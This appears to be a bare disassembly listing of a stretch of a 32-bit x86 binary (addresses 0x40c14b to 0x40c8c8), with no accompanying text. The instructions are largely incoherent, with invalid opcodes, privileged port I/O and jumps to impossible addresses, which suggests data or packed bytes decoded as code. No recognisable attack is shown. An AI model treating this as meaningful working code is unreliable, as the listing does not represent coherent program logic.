  40c14b:	jmp    0x40c198
  40c14d:	add    BYTE PTR [ebx],bl
  40c14f:	push   edx
  40c150:	xor    DWORD PTR [ebx],0x74f78e9b
  40c156:	xchg   edx,eax
  40c157:	sbb    DWORD PTR [eax+eax*1],ecx
  40c15a:	adc    DWORD PTR [ebx-0x4d6dfcdc],esi
  40c160:	in     eax,0x82
  40c162:	push   ebp
  40c163:	mov    bl,0xe1
  40c165:	add    edx,DWORD PTR [eax-0x6ffca2cf]
  40c16b:	push   edx
  40c16c:	out    0x34,al
  40c16e:	cmp    ebx,DWORD PTR gs:[eax]
  40c171:	mov    BYTE PTR [ebx+ebx*1-0x16],cl
  40c175:	fcom   DWORD PTR [eax-0x7c3c964e]
  40c17b:	ret    0x3728
  40c17e:	lods   al,BYTE PTR ds:[esi]
  40c17f:	stos   BYTE PTR es:[edi],al
  40c180:	jl     0x40c1c8
  40c182:	nop
  40c183:	pop    es
  40c184:	xchg   edx,eax
  40c185:	out    0x9f,eax
  40c187:	xor    eax,0x62433bea
  40c18c:	or     BYTE PTR [esi],dl
  40c18e:	aam    0xa3
  40c190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c191:	add    edx,DWORD PTR ds:0x4c67df3
  40c197:	jl     0x40c179
  40c199:	not    eax
  40c19b:	test   DWORD PTR [edi+0x2b3bc807],esp
  40c1a1:	add    al,0x83
  40c1a3:	stc    
  40c1a4:	aas    
  40c1a5:	lea    ecx,[ebx-0x453c9376]
  40c1ab:	mov    bl,0x64
  40c1ad:	int3   
  40c1ae:	add    BYTE PTR [eax],al
  40c1b0:	add    BYTE PTR [eax],al
  40c1b2:	add    BYTE PTR [esi+0x3b590f67],ah
  40c1b8:	hlt    
  40c1b9:	in     eax,dx
  40c1ba:	add    edi,DWORD PTR [esi]
  40c1bc:	pop    edi
  40c1bd:	mov    al,ds:0x7cb6b430
  40c1c2:	mov    ebp,0x16019d86
  40c1c7:	shl    BYTE PTR [edx-0xfef4b94],1
  40c1cd:	in     eax,0x5
  40c1cf:	nop
  40c1d0:	mov    dl,0x66
  40c1d2:	mov    edx,0x4460767
  40c1d7:	out    0xc4,eax
  40c1d9:	push   cs
  40c1da:	fs ret 0x83b1
  40c1de:	sahf   
  40c1df:	cld    
  40c1e0:	dec    esp
  40c1e1:	aad    0xe8
  40c1e3:	xchg   ebx,eax
  40c1e4:	cs iret 
  40c1e6:	aad    0x5f
  40c1e8:	or     BYTE PTR [ebx+0xd],bh
  40c1eb:	pushf  
  40c1ec:	pop    es
  40c1ed:	jnp    0x40c1f4
  40c1ef:	test   BYTE PTR [eax-0x11],ah
  40c1f2:	(bad)  
  40c1f3:	jmp    0x89b2:0xd3dac69d
  40c1fa:	sub    DWORD PTR [edi+esi*8-0x7f],edx
  40c1fe:	lahf   
  40c1ff:	dec    edx
  40c200:	int3   
  40c201:	int    0xa4
  40c203:	fstp   TBYTE PTR [ebx]
  40c205:	add    BYTE PTR [edi],ah
  40c207:	nop
  40c208:	mov    edx,0x338f020e
  40c20d:	(bad)  
  40c20e:	push   cs
  40c20f:	dec    ebx
  40c210:	push   0x6393f1cc
  40c215:	pop    eax
  40c216:	jae    0x40c218
  40c218:	add    BYTE PTR [eax],al
  40c21a:	add    BYTE PTR [eax],al
  40c21c:	sbb    eax,0x5903e99
  40c221:	call   0x32d0c4f4
  40c226:	call   0x51003821
  40c22b:	jb     0x40c201
  40c22d:	xchg   bl,dh
  40c22f:	loopne 0x40c1bb
  40c231:	ja     0x40c1fb
  40c233:	jmp    0x40c20b
  40c235:	xchg   bh,ch
  40c237:	lock call 0x8664:0xcaebc077
  40c23f:	jmp    0x40c24c
  40c241:	jns    0x40c250
  40c243:	adc    dl,BYTE PTR [edi+0x60]
  40c246:	test   BYTE PTR [eax-0x11f4f1ad],ch
  40c24c:	add    DWORD PTR [esi],edx
  40c24e:	pop    eax
  40c24f:	add    eax,DWORD PTR [ebp-0x6577719b]
  40c255:	mov    WORD PTR [ebx],?
  40c257:	add    BYTE PTR [edi],cl
  40c259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c25a:	into   
  40c25b:	or     DWORD PTR [ecx],0xffffffb1
  40c25e:	mov    eax,eax
  40c260:	sbb    esp,edx
  40c262:	or     eax,esi
  40c264:	outs   dx,BYTE PTR ds:[esi]
  40c265:	test   dh,al
  40c267:	data16 shr BYTE PTR [edi+0x68b03b68],0x13
  40c26f:	shr    BYTE PTR [edx+0x79830951],0x1
  40c276:	push   0x3
  40c278:	js     0x40c24d
  40c27a:	test   DWORD PTR [edx+0x2b],eax
  40c27d:	ins    BYTE PTR es:[edi],dx
  40c27e:	retf   
  40c27f:	mov    eax,DWORD PTR [eax]
  40c281:	add    BYTE PTR [eax],al
  40c283:	add    BYTE PTR [eax],al
  40c285:	in     eax,0xe5
  40c287:	or     edx,DWORD PTR [esi+0x26]
  40c28a:	xor    eax,0x2cb08bfe
  40c28f:	clc    
  40c290:	jmp    DWORD PTR [ecx+esi*4]
  40c293:	pop    eax
  40c294:	push   esp
  40c296:	rcr    DWORD PTR [eax+eax*2],0xf9
  40c29a:	lods   al,BYTE PTR ds:[esi]
  40c29b:	into   
  40c29c:	push   eax
  40c29d:	pop    es
  40c29e:	popa   
  40c29f:	out    0xe7,al
  40c2a1:	mov    bl,0xae
  40c2a3:	push   cs
  40c2a4:	xor    esi,DWORD PTR [eax+0x10c85d3]
  40c2aa:	imul   edx,DWORD PTR [eax-0x3e],0x8b58b1b5
  40c2b1:	fdiv   DWORD PTR [edi]
  40c2b3:	into   
  40c2b4:	test   edi,edx
  40c2b6:	aad    0xa
  40c2b8:	xor    edi,ecx
  40c2ba:	push   0x4bd183cb
  40c2bf:	jnp    0x40c2c8
  40c2c1:	xchg   DWORD PTR [ebx+0x1b],ecx
  40c2c4:	jo     0x40c281
  40c2c6:	jno    0x40c2d6
  40c2c8:	push   edi
  40c2c9:	in     al,dx
  40c2ca:	or     dh,al
  40c2cc:	mov    WORD PTR [esi-0x5b367654],?
  40c2d2:	mov    dl,0x3b
  40c2d4:	rcl    BYTE PTR [eax-0x2517e3d0],0x41
  40c2db:	or     al,0x0
  40c2dd:	or     eax,0xc7083f5b
  40c2e2:	popf   
  40c2e3:	pop    edx
  40c2e4:	call   0x4ce41c
  40c2e9:	add    BYTE PTR [eax],al
  40c2eb:	add    BYTE PTR [eax],al
  40c2ed:	add    bh,ch
  40c2ef:	mov    ch,0xc9
  40c2f1:	push   ebp
  40c2f2:	fild   WORD PTR [eax-0x71bd754d]
  40c2f8:	mov    ch,0x74
  40c2fa:	mov    WORD PTR [eax-0x67891536],gs
  40c300:	mov    ah,0xfe
  40c302:	popf   
  40c303:	add    bl,BYTE PTR [edi-0x1]
  40c306:	test   edi,esi
  40c308:	sbb    DWORD PTR [eax-0x70],eax
  40c30b:	nop
  40c30c:	mov    edx,0x711a5e8c
  40c311:	enter  0xb47c,0xa2
  40c315:	adc    bl,dl
  40c317:	sbb    DWORD PTR [eax*4+0x560426d0],ecx
  40c31e:	inc    edi
  40c31f:	dec    ebx
  40c320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c321:	imul   ecx,edx,0x19
  40c324:	or     al,0x5f
  40c326:	fcomp  DWORD PTR ds:[ecx+0x55]
  40c32a:	ds and al,0x83
  40c32d:	clc    
  40c32e:	sbb    esp,DWORD PTR [ecx-0x27c30191]
  40c334:	xor    DWORD PTR [ebx+0x74],0x402c82ff
  40c33b:	or     DWORD PTR [eax+eax*1+0x13],ecx
  40c33f:	cmc    
  40c340:	mov    dh,0x74
  40c342:	lea    ebp,[eax+0x4b0bd4b5]
  40c348:	mov    bh,0x36
  40c34a:	xchg   edi,eax
  40c34b:	and    eax,0xe61de783
  40c350:	in     eax,0x8c
  40c352:	add    BYTE PTR [eax],al
  40c354:	add    BYTE PTR [eax],al
  40c356:	add    BYTE PTR [edx+esi*4-0x4d6ff9c6],bl
  40c35d:	in     eax,0x8c
  40c35f:	inc    esi
  40c360:	sbb    ebx,edx
  40c362:	ficom  DWORD PTR [eax-0x1c3c964e]
  40c368:	sahf   
  40c369:	jl     0x40c36b
  40c36b:	or     eax,0xc352b7b7
  40c370:	xor    eax,0x1ae02be2
  40c375:	rcr    ch,0x90
  40c378:	mov    dl,0x95
  40c37a:	add    ch,BYTE PTR [ebx]
  40c37c:	mov    cl,0x13
  40c37e:	(bad)  
  40c37f:	(bad)  
  40c380:	fs mov edx,0xe5af525c
  40c386:	push   edx
  40c387:	rcr    DWORD PTR [esp+edi*2-0x4e],0xc5
  40c38c:	add    ebx,ebx
  40c38e:	xor    eax,DWORD PTR [edx-0x20731a8e]
  40c394:	sub    eax,0x38160814
  40c399:	out    0x3,al
  40c39b:	nop
  40c39c:	pop    edi
  40c39d:	mov    edx,0xbcd26a50
  40c3a2:	hlt    
  40c3a3:	out    dx,al
  40c3a4:	cwde   
  40c3a5:	out    dx,al
  40c3a6:	mov    esi,ss
  40c3a8:	and    BYTE PTR gs:[edi],bh
  40c3ab:	mov    ah,0xa2
  40c3ad:	loop   0x40c3b2
  40c3af:	nop
  40c3b0:	mov    dl,0x20
  40c3b2:	aas    
  40c3b3:	je     0x40c353
  40c3b5:	loopne 0x40c3b9
  40c3b7:	nop
  40c3b8:	mov    dl,0x62
  40c3ba:	rol    BYTE PTR [eax],cl
  40c3bc:	add    BYTE PTR [eax],al
  40c3be:	add    BYTE PTR [eax],al
  40c3c0:	cmp    eax,0x936ee0d0
  40c3c5:	je     0x40c406
  40c3c7:	sti    
  40c3c8:	sar    BYTE PTR [esi-0xc],cl
  40c3cb:	sbb    eax,0xff33ed6b
  40c3d0:	xor    eax,0x87e029c7
  40c3d5:	jl     0x40c3e5
  40c3d7:	out    dx,al
  40c3d8:	lods   eax,DWORD PTR ds:[esi]
  40c3d9:	(bad)  
  40c3da:	dec    edx
  40c3db:	add    eax,0x2e087da0
  40c3e0:	aad    0xc7
  40c3e2:	les    ebx,FWORD PTR ds:0x64d7d85e
  40c3e8:	cwde   
  40c3e9:	test   BYTE PTR [ecx-0xfd1e0ed],al
  40c3ef:	add    DWORD PTR [esp+esi*4-0x49],esi
  40c3f3:	in     eax,0x94
  40c3f5:	mov    WORD PTR [ebx],?
  40c3f7:	stos   BYTE PTR es:[edi],al
  40c3f8:	sbb    BYTE PTR [edi-0x7eaf4d98],0x7
  40c3ff:	iret   
  40c400:	cmp    ch,BYTE PTR [edi+0x2a]
  40c403:	stc    
  40c404:	gs stos DWORD PTR es:[edi],eax
  40c406:	push   0x1aced012
  40c40b:	aam    0x27
  40c40d:	jns    0x40c44e
  40c40f:	shl    bl,0x63
  40c412:	push   ecx
  40c413:	mov    ds:0xe678f51a,al
  40c418:	adc    cl,ah
  40c41a:	jo     0x40c3fe
  40c41c:	sbb    BYTE PTR [edi+0x5c64b91c],ch
  40c422:	out    0x97,al
  40c424:	add    BYTE PTR [eax],al
  40c426:	add    BYTE PTR [eax],al
  40c428:	add    ah,dl
  40c42a:	mov    cl,0xe
  40c42c:	fcmovbe st,st(3)
  40c42e:	mov    WORD PTR [ebp+0x556455e5],es
  40c434:	mov    al,ds:0xf8835cd2
  40c439:	inc    ebp
  40c43a:	add    ebx,DWORD PTR [edx]
  40c43c:	test   DWORD PTR [ecx-0x239df18e],esp
  40c442:	sub    eax,0x5f9e67dd
  40c447:	push   edi
  40c448:	sbb    bh,bh
  40c44a:	mov    edi,0x2e692c5
  40c44f:	lock jmp 0xb1a565
  40c455:	mov    ch,0x38
  40c457:	or     al,0x31
  40c459:	xchg   ebp,eax
  40c45a:	push   cs
  40c45b:	jl     0x40c46c
  40c45d:	test   DWORD PTR [edi-0x548afb8e],ebp
  40c463:	jo     0x40c46c
  40c465:	xchg   BYTE PTR [eax-0x3cd5c451],cl
  40c46b:	or     BYTE PTR [edi-0x48],al
  40c46e:	std    
  40c46f:	lds    edi,FWORD PTR [ebp+ecx*1+0xd]
  40c473:	fld    DWORD PTR [ebx]
  40c475:	pop    ss
  40c476:	sub    eax,DWORD PTR [esi-0x1]
  40c479:	in     al,dx
  40c47a:	out    dx,al
  40c47b:	ja     0x40c497
  40c47d:	mov    bl,0x1
  40c47f:	aaa    
  40c480:	cmp    al,0x59
  40c482:	sar    bh,cl
  40c484:	cmp    eax,DWORD PTR [eax-0x36]
  40c487:	or     bh,BYTE PTR [esp]
  40c48a:	enter  0xf07,0x0
  40c48e:	add    BYTE PTR [eax],al
  40c490:	add    BYTE PTR [eax],al
  40c492:	pop    es
  40c493:	div    BYTE PTR [ebx+eax*8]
  40c496:	cmp    al,0x2
  40c498:	inc    esi
  40c499:	dec    ecx
  40c49a:	push   eax
  40c49b:	and    BYTE PTR ds:0x89b9dffe,dh
  40c4a1:	rol    BYTE PTR [edi-0x52],cl
  40c4a4:	pop    esp
  40c4a5:	push   edi
  40c4a6:	pop    ds
  40c4a7:	dec    esi
  40c4a8:	hlt    
  40c4a9:	fsubr  st,st(0)
  40c4ab:	mov    ch,0x4f
  40c4ad:	(bad)  
  40c4ae:	in     eax,dx
  40c4af:	add    esi,eax
  40c4b1:	pop    edx
  40c4b2:	daa    
  40c4b3:	cmc    
  40c4b4:	pop    esp
  40c4b5:	push   esi
  40c4b6:	push   ds
  40c4b7:	int3   
  40c4b8:	or     DWORD PTR [ebx+0x5fd502d8],ecx
  40c4be:	out    0x90,al
  40c4c0:	add    DWORD PTR [ebp-0x7c961a08],ecx
  40c4c6:	shr    DWORD PTR [ebp-0x7139fa89],0xc7
  40c4cd:	jmp    0x40c486
  40c4cf:	cmp    BYTE PTR [edi-0x41],cl
  40c4d2:	nop
  40c4d3:	jno    0x40c4ca
  40c4d5:	(bad)  
  40c4d6:	pop    ds
  40c4d7:	adc    ecx,DWORD PTR [ebp+0xaf8c9c0]
  40c4dd:	add    BYTE PTR [ebx+0x2f408911],ch
  40c4e3:	jno    0x40c4da
  40c4e5:	(bad)  
  40c4e6:	(bad)  
  40c4e7:	out    dx,al
  40c4e8:	mov    eax,es
  40c4ea:	sub    DWORD PTR [eax+0xb],ebx
  40c4ed:	add    BYTE PTR [esp+esi*8],cl
  40c4f0:	ds pop es
  40c4f2:	cwde   
  40c4f3:	adc    eax,0x324e
  40c4f8:	add    BYTE PTR [eax],al
  40c4fa:	add    BYTE PTR [ebx+0x34],cl
  40c4fd:	repnz mov edi,0x9840f71
  40c503:	and    ecx,DWORD PTR [edx]
  40c505:	pop    ebp
  40c507:	xchg   edx,eax
  40c508:	xor    al,0x75
  40c50a:	gs or  eax,0x14082052
  40c510:	je     0x40c531
  40c512:	add    al,0x0
  40c514:	or     ah,BYTE PTR [edi+0x59cb6201]
  40c51a:	pop    esi
  40c51b:	retf   
  40c51c:	int3   
  40c51d:	pop    ebx
  40c51e:	push   ebx
  40c51f:	lds    eax,FWORD PTR [esi+eiz*1+0x43298024]
  40c526:	mov    ecx,DWORD PTR [ecx]
  40c528:	cld    
  40c529:	mov    eax,ds:0x84e8a48c
  40c52e:	je     0x40c4c0
  40c530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c531:	push   esi
  40c532:	mov    DWORD PTR [edi+esi*8+0x1b],esi
  40c536:	mov    edx,edi
  40c538:	jecxz  0x40c4f0
  40c53a:	jb     0x40c4d6
  40c53c:	mov    esi,edx
  40c53e:	sub    esp,DWORD PTR [esi+ecx*1+0x4c]
  40c542:	cmp    edx,ebx
  40c544:	jl     0x40c4e7
  40c546:	mov    bl,al
  40c548:	repz retf 0x5488
  40c54c:	not    DWORD PTR [ebx]
  40c54e:	lea    esp,[edx+esi*4+0xb7ff92]
  40c555:	out    0x88,al
  40c557:	fsubr  QWORD PTR [esi]
  40c559:	pop    esi
  40c55a:	add    edi,DWORD PTR [eax+0x2b85a]
  40c560:	add    BYTE PTR [eax],al
  40c562:	add    BYTE PTR [eax],al
  40c564:	nop
  40c565:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40c567:	das    
  40c568:	pop    ecx
  40c569:	sub    eax,0x35a7e01a
  40c56e:	xchg   esp,eax
  40c56f:	das    
  40c570:	mov    ds:0x8fe0122b,eax
  40c575:	or     cl,BYTE PTR [esi+esi*4+0x467d0076]
  40c57c:	nop
  40c57d:	sub    edx,esp
  40c57f:	jb     0x40c58d
  40c581:	repz sbb DWORD PTR [esi],edx
  40c584:	or     esi,DWORD PTR [esi-0x1b]
  40c587:	mov    BYTE PTR [ebx-0x3c3594be],cl
  40c58d:	mov    ch,0x8d
  40c58f:	outs   dx,BYTE PTR ds:[esi]
  40c590:	inc    ebp
  40c591:	add    BYTE PTR [ecx+0x3d],ah
  40c594:	jnp    0x40c591
  40c596:	shl    DWORD PTR [ebx+0xa],cl
  40c599:	stc    
  40c59a:	mov    al,0x55
  40c59c:	int    0x5b
  40c59e:	mov    esi,0x6cb29bc1
  40c5a3:	int    0xa
  40c5a5:	out    dx,al
  40c5a6:	pop    ebp
  40c5a7:	mov    eax,ds:0x80e5b23e
  40c5ac:	xlat   BYTE PTR ds:[ebx]
  40c5ad:	dec    DWORD PTR [ecx+ebp*4+0x60]
  40c5b1:	popa   
  40c5b2:	xchg   esp,eax
  40c5b3:	dec    esi
  40c5b4:	sub    dx,WORD PTR [edi]
  40c5b7:	mov    BYTE PTR [ebx-0x2a],cl
  40c5ba:	or     eax,0xaf9f1d4d
  40c5bf:	lock out 0x29,al
  40c5c2:	(bad)  
  40c5c4:	loop   0x40c575
  40c5c6:	fs pop esi
  40c5c8:	add    BYTE PTR [eax],al
  40c5ca:	add    BYTE PTR [eax],al
  40c5cc:	add    bh,dl
  40c5ce:	jmp    ebp
  40c5d0:	sub    DWORD PTR [ebp-0x1852f109],ebx
  40c5d6:	mov    ds:0xb293e904,eax
  40c5db:	push   ecx
  40c5dc:	jo     0x40c656
  40c5de:	(bad)  
  40c5df:	sbb    dh,BYTE PTR [edx-0x26]
  40c5e2:	mov    esp,0xaf8a5afb
  40c5e7:	mov    bh,0xf9
  40c5e9:	imul   edi,DWORD PTR [ebx-0x7983f2a6],0xe67f4702
  40c5f3:	jp     0x40c5e3
  40c5f5:	push   cs
  40c5f6:	aas    
  40c5f7:	or     eax,0xe48156f2
  40c5fc:	jb     0x40c612
  40c5fe:	int3   
  40c5ff:	loopne 0x40c5b9
  40c601:	and    DWORD PTR [ebx+ecx*8-0xd467e4],edi
  40c608:	or     BYTE PTR [edi+0x66eb5f2d],0xe4
  40c60f:	jnp    0x40c5e9
  40c611:	lods   eax,DWORD PTR ds:[esi]
  40c612:	lods   eax,DWORD PTR ds:[esi]
  40c613:	push   eax
  40c614:	sysexit 
  40c616:	iret   
  40c617:	jns    0x40c5f9
  40c619:	popf   
  40c61a:	lods   al,BYTE PTR ds:[esi]
  40c61b:	push   eax
  40c61c:	iret   
  40c61d:	and    al,0xc1
  40c61f:	jmp    DWORD PTR [ebp+edx*2+0x10eb7f2e]
  40c626:	mov    ds:0xb293e5b1,eax
  40c62b:	push   cs
  40c62c:	push   ecx
  40c62d:	jmp    esp
  40c62f:	or     eax,0xe9
  40c634:	add    BYTE PTR [eax],al
  40c636:	pop    ss
  40c637:	aas    
  40c638:	jnp    0x40c5df
  40c63a:	sbb    BYTE PTR [esi],cl
  40c63c:	jnp    0x40c60e
  40c63e:	jle    0x40c6ab
  40c640:	sub    bh,ch
  40c642:	jbe    0x40c62a
  40c644:	out    0x83,al
  40c646:	and    BYTE PTR [eax],al
  40c648:	lock bound esi,QWORD PTR [eax+0x516212d6]
  40c64f:	mov    dl,0x85
  40c651:	add    ch,ah
  40c653:	lea    ecx,[edx-0x7af7ba40]
  40c659:	dec    esp
  40c65a:	aad    0xae
  40c65c:	add    DWORD PTR [ecx],0x2a
  40c65f:	add    bh,BYTE PTR [eax-0x7c4dab00]
  40c665:	or     al,0xf1
  40c667:	sbb    cl,BYTE PTR [ebp-0x3]
  40c66a:	mov    esi,0x954c8543
  40c66f:	mov    ds:0x619c6a47,al
  40c674:	xor    esi,ebx
  40c676:	jle    0x40c6b0
  40c678:	push   0xffffffff
  40c67a:	ds inc ecx
  40c67c:	test   edi,eax
  40c67e:	mov    fs,WORD PTR [eax+0x51]
  40c681:	pop    ebx
  40c682:	shr    BYTE PTR [edi-0x34],1
  40c685:	or     al,0x79
  40c687:	jge    0x40c6ec
  40c689:	and    al,0x5d
  40c68b:	jge    0x40c665
  40c68d:	mov    edi,esp
  40c68f:	sbb    DWORD PTR [ebx],ecx
  40c691:	xlat   BYTE PTR ds:[ebx]
  40c692:	push   0xcec88bb2
  40c697:	sbb    al,0xeb
  40c699:	push   ecx
  40c69a:	add    BYTE PTR [eax],al
  40c69c:	add    BYTE PTR [eax],al
  40c69e:	add    BYTE PTR [edx-0x65f7d58b],dh
  40c6a4:	pop    ebx
  40c6a5:	pop    eax
  40c6a6:	push   edi
  40c6a7:	ret    0x3d4e
  40c6aa:	leave  
  40c6ab:	cwde   
  40c6ac:	inc    BYTE PTR [edx+0x437f262c]
  40c6b2:	and    al,0x19
  40c6b4:	or     eax,0xeeaa0ff3
  40c6b9:	out    dx,eax
  40c6ba:	(bad)  
  40c6bb:	stc    
  40c6bc:	jg     0x40c6c6
  40c6be:	cmp    al,0x99
  40c6c0:	mov    edx,0xcdf03c1c
  40c6c5:	or     bh,BYTE PTR [esp+edi*8]
  40c6c8:	ret    
  40c6c9:	add    al,0xf
  40c6cb:	dec    edi
  40c6cc:	icebp  
  40c6cd:	xor    bh,bh
  40c6cf:	nop
  40c6d0:	or     ecx,DWORD PTR [eax+eax*1]
  40c6d3:	gs push ss
  40c6d5:	inc    ebp
  40c6d6:	cmp    edx,ebp
  40c6d8:	jns    0x40c682
  40c6da:	cmp    cl,ch
  40c6dc:	or     al,0x89
  40c6de:	mov    bl,0x90
  40c6e0:	or     ecx,DWORD PTR [edx+ecx*4]
  40c6e3:	lahf   
  40c6e4:	pop    esi
  40c6e5:	xor    al,0x1
  40c6e7:	adc    BYTE PTR [ecx],dl
  40c6e9:	out    0x73,al
  40c6eb:	xchg   ebp,eax
  40c6ec:	mov    esp,DWORD PTR [ecx+0x73061d21]
  40c6f2:	std    
  40c6f3:	stos   DWORD PTR es:[edi],eax
  40c6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f5:	jo     0x40c6fc
  40c6f7:	push   esp
  40c6f8:	stos   DWORD PTR es:[edi],eax
  40c6f9:	ss cmp cl,ah
  40c6fc:	add    ah,BYTE PTR [eax]
  40c6fe:	add    al,0xc4
  40c700:	push   ss
  40c701:	xor    al,BYTE PTR ds:[eax]
  40c704:	add    BYTE PTR [eax],al
  40c706:	add    BYTE PTR [eax],al
  40c708:	(bad)  
  40c709:	(bad)  
  40c70a:	retf   0x773c
  40c70d:	or     ecx,DWORD PTR [eax+eax*1]
  40c710:	in     al,0xe3
  40c712:	inc    ebp
  40c713:	cmp    ebx,DWORD PTR [ebp-0x67]
  40c716:	test   eax,0x1de3b1ea
  40c71b:	jne    0x40c6a0
  40c71d:	cmp    dl,bl
  40c71f:	mov    esi,ss
  40c721:	jl     0x40c6b4
  40c723:	add    edx,edx
  40c725:	ror    DWORD PTR [edx-0x5af823c9],cl
  40c72b:	cmc    
  40c72c:	push   edx
  40c72d:	or     bh,BYTE PTR [eax]
  40c72f:	add    eax,0x71b7d0d6
  40c734:	sub    al,0xa0
  40c736:	mov    bh,0x74
  40c738:	xchg   ecx,eax
  40c739:	sbb    al,0x71
  40c73b:	adc    eax,DWORD PTR ds:0x90000c0f
  40c741:	or     BYTE PTR [esi+0x24],0xa8
  40c745:	nop
  40c746:	fsubr  QWORD PTR [edx]
  40c748:	fbstp  TBYTE PTR [edx-0x7b]
  40c74b:	aam    0x91
  40c74d:	mov    dl,0xe5
  40c74f:	xchg   DWORD PTR [edi],ebp
  40c751:	xchg   ah,dl
  40c753:	xchg   dl,cl
  40c755:	xchg   bl,ch
  40c757:	hlt    
  40c758:	shr    DWORD PTR [edi+0x5e],0xd0
  40c75c:	inc    ebp
  40c75d:	jb     0x40c744
  40c75f:	pushf  
  40c760:	xchg   ebx,eax
  40c761:	sub    DWORD PTR ds:0x2409d67d,edx
  40c767:	lods   eax,DWORD PTR ds:[esi]
  40c768:	mov    esi,0x406cfc
  40c76d:	add    BYTE PTR [eax],al
  40c76f:	add    BYTE PTR [eax],al
  40c771:	ins    BYTE PTR es:[edi],dx
  40c772:	mov    ds:0x761ad37c,al
  40c777:	or     DWORD PTR [ebx+ebx*1],ecx
  40c77a:	mov    dl,0x6e
  40c77c:	pop    ss
  40c77d:	or     BYTE PTR [edi],dh
  40c77f:	mov    ah,0x37
  40c781:	test   DWORD PTR [ebx+0x7a],esi
  40c784:	xor    DWORD PTR [ecx-0x794f08f7],edx
  40c78a:	cld    
  40c78b:	ins    BYTE PTR es:[edi],dx
  40c78c:	aas    
  40c78d:	mov    ah,0xa2
  40c78f:	ins    BYTE PTR es:[edi],dx
  40c790:	inc    edi
  40c791:	lods   al,BYTE PTR ds:[esi]
  40c792:	call   0x19d:0xab1ad27c
  40c799:	ds mov dl,0xe5
  40c79c:	test   BYTE PTR [edi-0x4],dl
  40c79f:	mov    WORD PTR ds:0x5228f20b,es
  40c7a5:	in     eax,dx
  40c7a6:	push   edi
  40c7a7:	cs (bad) 
  40c7a9:	(bad)  
  40c7aa:	mov    dl,0x64
  40c7ac:	lahf   
  40c7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7ae:	pop    edi
  40c7af:	sbb    bl,BYTE PTR [edx-0x21]
  40c7b2:	mov    BYTE PTR ds:0xa228287d,al
  40c7b8:	out    0x77,eax
  40c7ba:	push   edi
  40c7bb:	push   0xffffffdf
  40c7bd:	(bad)  
  40c7be:	mov    dh,ch
  40c7c0:	hlt    
  40c7c1:	inc    ecx
  40c7c2:	rcl    dh,cl
  40c7c4:	push   ecx
  40c7c5:	sbb    DWORD PTR [edi-0x78e71bf7],ecx
  40c7cb:	push   cs
  40c7cc:	or     eax,0x54af3a0
  40c7d1:	cwde   
  40c7d2:	lods   eax,DWORD PTR ds:[esi]
  40c7d3:	push   cs
  40c7d4:	jmp    0x40c7d9
  40c7d9:	add    BYTE PTR [ebx-0x643ab50d],dl
  40c7df:	sti    
  40c7e0:	push   cs
  40c7e1:	jmp    0xc59bf179
  40c7e6:	xor    DWORD PTR [edi-0x66eb090f],0xd
  40c7ed:	jmp    0xeef87385
  40c7f2:	imul   esi,DWORD PTR [edi-0x6b638a35],0xb362af33
  40c7fc:	push   0x1ad65822
  40c801:	pop    edi
  40c802:	xchg   edi,eax
  40c803:	xchg   esp,eax
  40c804:	xor    esp,DWORD PTR ds:0xee79a3a8
  40c80a:	adc    dh,ah
  40c80c:	or     al,0x2
  40c80e:	inc    ecx
  40c80f:	adc    eax,0x8bac40f2
  40c815:	mov    eax,0xf60eb28c
  40c81a:	out    0xb4,al
  40c81c:	adc    DWORD PTR [esi],0xcef72f92
  40c822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c823:	test   eax,0xac72918b
  40c828:	mov    DWORD PTR [ebp-0x6c],ebx
  40c82b:	mov    dl,0xe
  40c82d:	jb     0x40c825
  40c82f:	daa    
  40c830:	xlat   BYTE PTR ds:[ebx]
  40c831:	pusha  
  40c832:	adc    dh,0x2a
  40c835:	mov    dl,0xf8
  40c837:	jg     0x40c868
  40c839:	rcr    edi,cl
  40c83b:	pop    ebx
  40c83c:	push   0x20
  40c841:	add    BYTE PTR [eax],al
  40c843:	xchg   esi,eax
  40c844:	test   DWORD PTR [esp+eiz*2],ebp
  40c847:	(bad)  
  40c848:	cld    
  40c849:	cmp    esp,DWORD PTR [eax]
  40c84b:	outs   dx,BYTE PTR ds:[esi]
  40c84c:	mov    ecx,0xa04c0036
  40c851:	fs pop esp
  40c853:	and    al,0x32
  40c855:	xor    dh,bh
  40c857:	sub    ch,dl
  40c859:	xor    eax,0x85443d28
  40c85e:	ins    BYTE PTR es:[edi],dx
  40c85f:	fisttp QWORD PTR [esi]
  40c861:	pop    sp
  40c863:	es inc ebp
  40c865:	iret   
  40c866:	add    ebp,edi
  40c868:	mov    bl,0x8b
  40c86a:	(bad)  
  40c86b:	jmp    0x40c874
  40c86d:	sti    
  40c86e:	jb     0x40c81b
  40c870:	ja     0x40c8e5
  40c872:	and    al,0xcd
  40c874:	ja     0x40c8d1
  40c876:	and    al,0xd9
  40c878:	ja     0x40c8bd
  40c87a:	and    al,0xf5
  40c87c:	pop    es
  40c87d:	sti    
  40c87e:	jne    0x40c83a
  40c880:	das    
  40c881:	loope  0x40c885
  40c883:	and    ch,ch
  40c885:	and    al,0xdf
  40c887:	xor    al,0xa3
  40c889:	cdq    
  40c88a:	add    al,0xa9
  40c88c:	scas   al,BYTE PTR es:[edi]
  40c88d:	push   cs
  40c88e:	rcl    DWORD PTR [edx+0x1e],1
  40c891:	pop    esi
  40c892:	aam    0x78
  40c894:	mov    dh,0x8a
  40c896:	sar    BYTE PTR [ebp-0x4324762b],0xfe
  40c89d:	cmp    al,0xd2
  40c89f:	mov    ebx,0xb94ecf87
  40c8a4:	scas   al,BYTE PTR es:[edi]
  40c8a5:	jecxz  0x40c8d1
  40c8a7:	add    BYTE PTR [eax],al
  40c8a9:	add    BYTE PTR [eax],al
  40c8ab:	add    BYTE PTR [esi-0x7f],dh
  40c8ae:	or     DWORD PTR [esi+0x42],esp
  40c8b1:	cmc    
  40c8b2:	jnp    0x40c888
  40c8b4:	lahf   
  40c8b5:	or     eax,0xc465244c
  40c8ba:	pop    es
  40c8bb:	data16 add dh,BYTE PTR [edx+0x2a]
  40c8bf:	adc    al,0x3f
  40c8c1:	lock imul edi,DWORD PTR [ebx],0x741811fd
  40c8c8:	push   es
